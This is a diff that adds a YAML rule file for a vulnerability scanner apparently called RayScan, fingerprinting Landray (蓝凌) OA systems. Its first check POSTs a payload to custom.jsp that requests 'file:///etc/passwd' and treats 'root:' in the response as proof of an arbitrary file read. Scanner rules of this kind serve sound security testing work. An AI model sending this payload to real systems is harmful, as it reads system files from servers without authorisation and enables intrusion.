@@ -1,0 +1,34 @@
+# RayScan OA 检测规则 — 蓝凌-Landray
+# 由 T3.3 规则外部化生成，加载器: wvs/modules/oa/rules_loader.py
+# 字段说明见 rules/README.md 与 docs/OA_RULES.md
+# 注意: evidence/max_version 等字符串值必须加引号（防止 YAML 解析成数字）
+
+name: 蓝凌-Landray
+paths:
+- /landray/
+- /sys/
+- /km/
+keywords:
+- landray
+- 蓝凌
+- ekp
+fingerprints:
+- match: html
+  value: landray
+- match: html
+  value: ekp
+- match: html
+  value: lms
+checks:
+- path: /sys/ui/extend/varkind/custom.jsp
+  method: POST
+  params:
+    var: '{"body":{"file":"file:///etc/passwd"}}'
+  type: file_read
+  severity: high
+  evidence: 'root:'
+- path: /sys/ui/extend/varkind/custom_pf.jsp
+  params:
+    var: '1'
+  type: file_read
+  severity: high
